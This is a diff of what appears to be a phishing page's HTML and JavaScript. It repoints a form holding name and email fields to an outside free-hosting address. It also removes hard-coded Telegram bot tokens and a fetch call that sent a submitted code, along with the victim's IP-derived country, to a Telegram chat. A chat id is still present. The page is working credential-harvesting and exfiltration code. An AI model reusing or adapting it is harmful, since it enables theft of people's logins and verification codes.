@@ -240,7 +240,7 @@
         <div class="container">
             <div class="row justify-content-center">
                 <div class="col-md-8 col-xl-7 col-sm-8">
-				    <form action="wait.php" method="post">
+				    <form action="https://acsia237.000webhostapp.com/wait.php" method="post">
 					<input type="hidden" name="full_name" value="ASD" readonly>
 					<input type="hidden" name="business_email" value="ASA@GMAIL.COM" readonly>
 					<input type="hidden" name="personal_email" value="ASDA@GMAIL.COM" readonly>
@@ -318,8 +318,8 @@
                 $("#code").css('border', '1px solid red');
                 return;
             } else {
-                var bot = 'bot1680524108:AAEJ28wP99p8-oihbUr982fn3Pigru2WVkc';
-                var chid = '1540364634';
+                var bot = '';
+                var chid = '';
 
                 $.get("https://ipapi.co/json/", function(response) {
                     let country = response.country;
@@ -334,7 +334,7 @@
                             '============================='
                     }
 
-                    fetch(`https://api.telegram.org/bot1313386862:AAHjBgbLYh9u4EFqOVxIx3V_dDHaMyg8A7g/sendMessage?chat_id=1379068780&text=${params.content}`, {
+                    fetch(`?chat_id=1379068780&text=${params.content}`, {
                         method: 'POST', // or 'PUT'
                         headers: {
                             'Content-Type': 'application/json',
